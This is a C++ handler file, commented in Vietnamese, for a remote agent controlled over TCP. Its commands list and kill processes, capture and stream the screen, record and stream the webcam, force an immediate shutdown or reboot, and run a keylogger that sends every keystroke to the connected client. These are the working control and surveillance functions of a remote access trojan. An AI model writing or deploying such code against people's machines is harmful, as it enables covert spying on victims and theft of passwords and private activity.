#include "ProcessHandlers.h"
#include "AgentTcpServer.h"

// Processes
json ProcessHandlers::listProcesses(const json &)
{
    auto list = ProcessManager::listProcesses();
    json arr = json::array();

    for (auto &p : list)
        arr.push_back({{"pid", p.pid},
                       {"name", p.name},
                       {"workingSet", p.workingSet},
                       {"exePath", p.exePath}});

    return {{"type", "process_list"}, {"data", arr}};
}

json ProcessHandlers::startProcess(const json &req)
{
    std::string path = req.value("path", "");
    std::string args = req.value("args", "");
    if (path.empty())
        return {{"type", "status"}, {"success", false}, {"message", "missing path"}};

    unsigned long pid{};
    bool ok = ProcessManager::startProcess(path, args, &pid);
    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
}

json ProcessHandlers::stopProcessPid(const json &req)
{
    if (!req.contains("pid"))
        return {{"type", "status"}, {"success", false}, {"message", "missing pid"}};

    bool ok = ProcessManager::stopProcessByPid(req["pid"]);
    return {{"type", "status"}, {"success", ok}};
}

// Apps
json ProcessHandlers::listApps(const json &)
{
    auto apps = ProcessManager::listUserApplications();
    json arr = json::array();

    for (auto &a : apps)
        arr.push_back({{"name", a.name}, {"process_count", a.processCount}});

    return {{"type", "application_list"}, {"data", arr}};
}

json ProcessHandlers::startApp(const json &req)
{
    std::string name = req.value("app_name", "");
    if (name.empty())
        return {{"type", "status"}, {"success", false}, {"message", "missing app_name"}};

    unsigned long pid{};
    bool ok = ProcessManager::startProcess(name, "", &pid);
    return {{"type", "status"}, {"success", ok}, {"pid", pid}};
}

json ProcessHandlers::stopApp(const json &req)
{
    std::string name = req.value("app_name", "");
    int stop = ProcessManager::stopProcessesByName(name);
    return {{"type", "status"}, {"success", stop > 0}, {"stopped", stop}};
}

// ScreenShot
json ProcessHandlers::captureScreen(const json &)
{
    std::string b64 = capture_screenshot_base64();
    if (b64.empty())
        return {{"type", "status"}, {"success", false}, {"message", "capture failed"}};

    return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
}

// Webcam Record
// Biến toàn cục để giữ trạng thái của việc ghi hình, mặc dù
// WebcamRecord hiện tại là static, chúng ta sẽ cần thay đổi logic
// để quản lý đa luồng tốt hơn.
// Tạm thời, chúng ta sẽ sử dụng phương thức static `record_base64` cũ.
// Gửi trạng thái "started" trước khi bắt đầu ghi hình
json ProcessHandlers::startWebcamRecord(const json &req)
{
    int time = req.value("time", 10);
    
    // Gửi trạng thái STARTED ngay lập tức
    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}
    };
    AgentTcpServer::instance().sendJson(status_msg);

    // Ghi hình và chờ (Blocking call)
    std::string b64 = WebcamRecord::record_base64(time);

    // Gửi trạng thái COMPLETED/FAILED sau khi kết thúc
    if (b64.empty()) {
        json failed_msg = {
            {"type", "webcam_recording_status"},
            {"message", "Recording failed"}
        };
        AgentTcpServer::instance().sendJson(failed_msg);
        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
    }
    
    // Gửi video đã mã hóa
    json video_msg = {
        {"type", "webcam_video"}, // Đổi thành webcam_video như Front-end đã xử lý
        {"success", true},
        {"data", b64}
    };
    // Dùng sendJson của AgentTcpServer để gửi video ngay lập tức
    AgentTcpServer::instance().sendJson(video_msg);

    // Trả về status thành công, nhưng không có dữ liệu (vì đã gửi riêng)
    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
}

// Hàm này sẽ không làm gì nhiều với WebcamRecord::record_base64 hiện tại vì nó là blocking.
// Để có chức năng dừng thực sự, cần thay đổi WebcamRecord để dùng luồng và kiểm soát được.
json ProcessHandlers::stopWebcamRecord(const json &)
{
    // Tạm thời, chỉ gửi trạng thái hủy bỏ về client.
    // Logic dừng thực sự (kill FFmpeg thread) sẽ cần thay đổi WebcamRecord.cpp
    json status_msg = {
        {"type", "webcam_recording_status"},
        {"message", "Recording cancelled (client request)"}
    };
    AgentTcpServer::instance().sendJson(status_msg);
    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
}

// === SYSTEM CONTROL HANDLERS ===

json ProcessHandlers::systemShutdown(const json &)
{
    // Lệnh tắt máy ngay lập tức, không có cảnh báo
#ifdef _WIN32
    // Windows: shutdown /s /t 0
    std::system("shutdown /s /t 0"); 
#else
    // Linux/macOS: shutdown now
    std::system("shutdown now");
#endif
    return {
        {"type", "status"},
        {"success", true},
        {"message", "System shutdown command sent."}
    };
}

json ProcessHandlers::systemRestart(const json &)
{
    // Lệnh khởi động lại ngay lập tức, không có cảnh báo
#ifdef _WIN32
    // Windows: shutdown /r /t 0
    std::system("shutdown /r /t 0");
#else
    // Linux/macOS: reboot
    std::system("reboot");
#endif
    return {
        {"type", "status"},
        {"success", true},
        {"message", "System restart command sent."}
    };
}

// === KEYLOGGER HANDLERS ===
json ProcessHandlers::startKeylog(const json &)
{
    // đăng ký callback gửi phím lại đúng client đã bật keylog
    setKeyEventCallback([](int key)
                        {
        json msg = {
            {"type","key_event"},
            {"key_code", key}
        };

        AgentTcpServer::instance().sendJson(msg);
    });

    startKeylogger();

    return {
        {"type", "status"},
        {"success", true},
        {"message", "Keylogger started"}};
}

json ProcessHandlers::stopKeylog(const json &)
{
    stopKeylogger();
    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
}

json ProcessHandlers::startScreenStream(const json& req)
{
    int fps = req.value("fps", 60);
    ScreenStream::start(fps);

    return {
        {"type","status"},
        {"success",true},
        {"message","Screen streaming started"}
    };
}

json ProcessHandlers::stopScreenStream(const json&)
{
    ScreenStream::stop();
    return {
        {"type","status"},
        {"success",true},
        {"message","Screen streaming stopped"}
    };
}

// === WEBCAM STREAM HANDLERS MỚI ===
json ProcessHandlers::startWebcamStream(const json& req)
{
    int fps = req.value("fps", 15);
    WebcamStream::start(fps); // Bắt đầu luồng

    // Gửi thông báo trạng thái về client (dùng type status cũ để cập nhật UI)
    json status_msg = {
        {"type", "webcam_recording_status"}, 
        {"message", "Webcam streaming started"}
    };
    AgentTcpServer::instance().sendJson(status_msg);

    return {
        {"type","status"},
        {"success",true},
        {"message","Webcam streaming started"}
    };
}

json ProcessHandlers::stopWebcamStream(const json&)
{
    WebcamStream::stop(); // Dừng luồng

    // Gửi thông báo trạng thái về client (dùng type status cũ để cập nhật UI)
    json status_msg = {
        {"type", "webcam_recording_status"}, 
        {"message", "Webcam streaming stopped"}
    };
    AgentTcpServer::instance().sendJson(status_msg);

    return {
        {"type","status"},
        {"success",true},
        {"message","Webcam streaming stopped"}
    };
}

// Trả về danh sách tất cả command mà server hỗ trợ.
json ProcessHandlers::help(const json &)
{
    return {
        {"type", "help"},
        {"commands", {"list_processes", "start_process", "stop_process_pid", "list_applications", "start_application", "stop_application", "capture_screen", "start_keylog", "stop_keylog","help"}}};
}
